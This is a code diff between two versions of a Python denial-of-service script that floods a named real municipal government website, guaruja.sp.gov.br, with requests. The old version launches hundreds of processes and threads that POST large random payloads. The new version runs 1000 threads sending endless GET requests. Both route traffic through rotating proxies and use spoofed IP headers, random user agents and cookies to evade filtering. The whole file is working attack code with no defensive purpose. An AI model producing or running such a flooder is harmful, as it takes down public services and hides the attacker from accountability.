@@ -1,84 +1,79 @@
-import multiprocessing
 import threading
 import requests
-from requests.exceptions import ProxyError, Timeout
 import random
+import string
 import time
-import os
 
-def load_file(filename):
-    with open(filename, 'r') as file:
-        return [line.strip() for line in file.readlines()]
+target_url = "https://www.guaruja.sp.gov.br/"
 
-def verify_proxy_type(proxy):
-    if proxy.startswith("http://") or proxy.startswith("https://"):
-        return "http"
-    elif "socks4://" in proxy:
-        return "socks4"
-    elif "socks5://" in proxy:
-        return "socks5"
-    else:
-        return None
+with open('useragents.txt', 'r') as file:
+    user_agents = [line.strip() for line in file.readlines()]
 
-def generate_random_data():
-    size = random.randint(10 * 1024 * 1024, 27 * 1024 * 1024)
-    return os.urandom(size)
+with open('referers.txt', 'r') as file:
+    referers = [line.strip() for line in file.readlines()]
 
-def make_requests(user_agents, referers, proxies, fake_hosts):
+with open('proxy.txt', 'r') as file:
+    proxies_list = [line.strip() for line in file.readlines()]
+
+def get_random_ip():
+    time.sleep(random.uniform(0.1, 0.5))
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+
+def get_proxy():
+    proxy_url = random.choice(proxies_list)
+    if proxy_url.startswith("http://") or proxy_url.startswith("https://"):
+        return {"http": proxy_url, "https": proxy_url}
+    elif proxy_url.startswith("socks4://"):
+        return {"http": proxy_url, "https": proxy_url}
+    elif proxy_url.startswith("socks5://"):
+        return {"http": proxy_url, "https": proxy_url}
+    return None
+
+def flood():
     while True:
-        for _ in range(450):
+        custom_headers = {
+            "User-Agent": random.choice(user_agents),
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "keep-alive",
+            "Cache-Control": "no-cache",
+            "Accept": "*/*",
+            "Referer": random.choice(referers),
+            "Accept-Encoding": "gzip, deflate",
+            "Pragma": "no-cache",
+            "Upgrade-Insecure-Requests": "1",
+            "X-Forwarded-For": get_random_ip(),
+            "X-Forwarded-Proto": "http",
+            "X-Real-IP": get_random_ip(),
+            "X-Frame-Options": "deny",
+            "X-Content-Type-Options": "nosniff",
+            "X-XSS-Protection": "1; mode=block",
+            "DNT": "1",
+            "If-None-Match": 'W/"cb85038b0d4e19"',
+            "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
+            "Cookie": "".join(random.choices(string.ascii_letters + string.digits, k=20))
+        }
+        proxy_dict = get_proxy()
+        time.sleep(random.uniform(0.5, 2))
+
+        if proxy_dict is not None:
             try:
-                proxy = random.choice(proxies)
-                proxy_dict = {verify_proxy_type(proxy): proxy}
-                headers = {
-                    'Host': random.choice(fake_hosts),
-                    'User-Agent': random.choice(user_agents),
-                    'Referer': random.choice(referers),
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'DNT': '1',
-                    'Connection': 'keep-alive',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache',
-                    'TE': 'Trailers',
-                }
-                time.sleep(random.uniform(0.5, 2.0))
-                random_data = generate_random_data()
-                response = requests.post("https://www.guaruja.sp.gov.br/", headers=headers, proxies=proxy_dict, data=random_data, timeout=5)
-                print(f"POST request to {headers['Host']} success: {response.status_code}")
-            except (ProxyError, Timeout):
-                print("Proxy failed or request timed out")
-        time.sleep(random.uniform(5, 7))
+                response = requests.get(target_url, headers=custom_headers, proxies=proxy_dict)
+                print(f"GET request sent to {target_url} via {list(proxy_dict.values())[0]}. Response status code: {response.status_code}")
+            except requests.exceptions.RequestException as e:
+                print(f"An error occurred: {e}")
+        else:
+            print("Invalid proxy format.")
 
-def thread_function(user_agents, referers, proxies, fake_hosts):
-    threads = []
-    for _ in range(309):
-        thread = threading.Thread(target=make_requests, args=(user_agents, referers, proxies, fake_hosts))
-        threads.append(thread)
-        thread.start()
+num_threads = 1000
 
-    for thread in threads:
-        thread.join()
+threads = []
+for _ in range(num_threads):
+    t = threading.Thread(target=flood)
+    t.daemon = True
+    threads.append(t)
 
-def main():
-    user_agents = load_file("useragents.txt")
-    referers = load_file("referers.txt")
-    proxies = [proxy for proxy in load_file("proxy.txt") if verify_proxy_type(proxy)]
-    fake_hosts = ["https://check-host.net", "https://www.instagram.com", "https://developers.facebook.com/docs/instagram"]
+for t in threads:
+    t.start()
 
-    while True:
-        processes = []
-        for _ in range(297):
-            process = multiprocessing.Process(target=thread_function, args=(user_agents, referers, proxies, fake_hosts))
-            processes.append(process)
-            process.start()
-
-        for process in processes:
-            process.join()
-        
-        time.sleep(1)
-
-if __name__ == "__main__":
-    main()
+for t in threads:
+    t.join()
